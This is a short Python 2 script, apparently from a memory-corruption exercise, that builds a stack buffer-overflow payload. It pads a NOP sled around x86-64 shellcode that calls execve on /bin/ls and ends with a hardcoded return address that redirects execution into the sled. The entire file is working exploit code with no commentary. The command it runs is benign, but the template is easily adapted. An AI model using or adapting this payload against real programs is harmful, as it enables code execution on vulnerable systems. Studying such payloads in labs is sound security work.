import struct

input_addr = 0x7fffffffe460

padding_len = 264

sc = '\x31\xd2\x48\xbf\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x52\x57\x54\x5f\x52\x57\x54\x5e\x6a\x3b\x58\x0f\x05'

padding_len = 264 - len(sc)

shellcode = ((padding_len/2) * '\x90') + '\x90' + sc + ((padding_len/2) * '\x90')  + struct.pack('<Q', input_addr)

print shellcode
